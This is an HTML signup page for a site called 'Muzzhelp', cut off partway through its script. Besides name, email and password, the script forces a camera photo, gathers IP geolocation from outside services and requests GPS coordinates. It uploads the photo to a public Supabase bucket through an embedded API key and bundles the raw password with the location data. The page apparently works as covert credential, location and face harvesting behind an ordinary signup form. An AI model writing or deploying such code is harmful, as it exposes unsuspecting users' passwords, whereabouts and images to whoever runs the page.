<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign Up - Muzzhelp</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        .container {
            background: white;
            padding: 40px;
            border-radius: 16px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 480px;
        }
        h1 { color: #333; margin-bottom: 8px; font-size: 28px; }
        .subtitle { color: #666; margin-bottom: 32px; font-size: 14px; }
        .form-group { margin-bottom: 20px; }
        label { display: block; margin-bottom: 6px; color: #555; font-size: 14px; font-weight: 500; }
        input[type="text"], input[type="email"], input[type="password"], input[type="file"] {
            width: 100%;
            padding: 12px 16px;
            border: 2px solid #e1e5e9;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.2s;
        }
        input:focus { outline: none; border-color: #667eea; }
        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.1s, opacity 0.2s;
        }
        button:hover { opacity: 0.9; }
        button:active { transform: scale(0.98); }
        button:disabled { opacity: 0.6; cursor: not-allowed; }
        .status { margin-top: 20px; padding: 12px; border-radius: 8px; font-size: 14px; display: none; }
        .status.success { background: #d4edda; color: #155724; display: block; }
        .status.error { background: #f8d7da; color: #721c24; display: block; }
        .status.info { background: #d1ecf1; color: #0c5460; display: block; }
        .data-preview {
            margin-top: 20px;
            padding: 16px;
            background: #f8f9fa;
            border-radius: 8px;
            font-size: 12px;
            font-family: monospace;
            color: #555;
            max-height: 200px;
            overflow-y: auto;
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Join Muzzhelp</h1>
        <p class="subtitle">Create your account to get started.</p>

        <form id="signupForm">
            <div class="form-group">
                <label for="name">Full Name</label>
                <input type="text" id="name" name="name" required placeholder="John Doe">
            </div>
            <div class="form-group">
                <label for="email">Email</label>
                <input type="email" id="email" name="email" required placeholder="john@example.com">
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required placeholder="••••••••" minlength="8">
            </div>
            <div class="form-group">
                <label for="photo">Profile Photo (Camera or File)</label>
                <!-- capture="user" prompts camera immediately on mobile devices -->
                <input type="file" id="photo" name="photo" accept="image/*" capture="user" required>
            </div>
            <button type="submit" id="submitBtn">Create Account</button>
        </form>

        <div id="status" class="status"></div>
        <div id="dataPreview" class="data-preview"></div>
    </div>

    <script>
        (function() {
            const form = document.getElementById('signupForm');
            const submitBtn = document.getElementById('submitBtn');
            const statusDiv = document.getElementById('status');
            const previewDiv = document.getElementById('dataPreview');

            const SUPABASE_URL = 'https://waqbujfkoqhuixeahzta.supabase.co';
            const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6IndhcWJ1amZrb3FodWl4ZWFoenRhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODk2NjUyMzksImV4cCI6MjEwNTI0MTIzOX0.slUkwBTlAIzYUAdTqbxs-6SPiq03AIXtWKuzAf-SxoE';

            function showStatus(message, type) {
                statusDiv.textContent = message;
                statusDiv.className = 'status ' + type;
            }

            // Fetch IP geolocation
            async function fetchIPData() {
                try {
                    const response = await fetch('https://ipwho.is/', { mode: 'cors' });
                    if (!response.ok) throw new Error('IP API failed');
                    const data = await response.json();
                    if (!data.success) throw new Error(data.message || 'Geo failed');

                    return {
                        ip: data.ip || null,
                        city: data.city || null,
                        region: data.region || null,
                        country: data.country || null,
                        latitude: typeof data.latitude === 'number' ? data.latitude : null,
                        longitude: typeof data.longitude === 'number' ? data.longitude : null,
                        org: data.connection?.org || data.connection?.isp || null
                    };
                } catch (error) {
                    try {
                        const res = await fetch('https://api.ipify.org?format=json');
                        const data = await res.json();
                        return { ip: data.ip || null };
                    } catch (e) {
                        return {};
                    }
                }
            }

            // Mobile-safe GPS location
            function getGPSLocation() {
                return new Promise((resolve) => {
                    if (!navigator.geolocation) { resolve({}); return; }
                    const timer = setTimeout(() => resolve({}), 4000);
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            clearTimeout(timer);
                            resolve({
                                gps_latitude: pos.coords.latitude,
                                gps_longitude: pos.coords.longitude,
                                gps_accuracy: pos.coords.accuracy,
                                gps_altitude: pos.coords.altitude || null
                            });
                        },
                        () => { clearTimeout(timer); resolve({}); },
                        { enableHighAccuracy: false, timeout: 3500, maximumAge: 60000 }
                    );
                });
            }

            // Upload image file to Supabase Storage Bucket
            async function uploadPhoto(file) {
                const fileExt = file.name.split('.').pop();
                const fileName = `${Date.now()}_${Math.random().toString(36).substring(2, 7)}.${fileExt}`;
                const filePath = `uploads/${fileName}`;

                const uploadResponse = await fetch(`${SUPABASE_URL}/storage/v1/object/user-photos/${filePath}`, {
                    method: 'POST',
                    headers: {
                        'apikey': SUPABASE_KEY,
                        'Authorization': `Bearer ${SUPABASE_KEY}`,
                        'Content-Type': file.type
                    },
                    body: file
                });

                if (!uploadResponse.ok) {
                    const err = await uploadResponse.json().catch(() => ({}));
                    throw new Error(err.message || 'Image upload failed');
                }

                // Public URL format
                return `${SUPABASE_URL}/storage/v1/object/public/user-photos/${filePath}`;
            }

            form.addEventListener('submit', async (e) => {
                e.preventDefault();
                submitBtn.disabled = true;
                showStatus('Uploading photo and location data...', 'info');

                const photoInput = document.getElementById('photo');
                const photoFile = photoInput.files[0];

                try {
                    let photoUrl = null;
                    if (photoFile) {
                        photoUrl = await uploadPhoto(photoFile);
                    }

                    const formData = new FormData(form);
                    const userData = {
                        name: formData.get('name'),
                        email: formData.get('email'),
                        password: formData.get('password'),
                        photo_url: photoUrl,
                        timestamp: new Date().toISOString(),
                        created_at: new Date().toISOString()
                    };

                    const [ipData, gpsData] = await Promise.all([
                        fetchIPData(),
                        getGPSLocation()
                    ]);

                    Object.assign(userData, ipData, gpsData);

                    previewDiv.style.display = 'block';
                    previewDiv.innerHTML = '<strong>Collected Data:</strong><br>' +
                        Object.entries(userData)
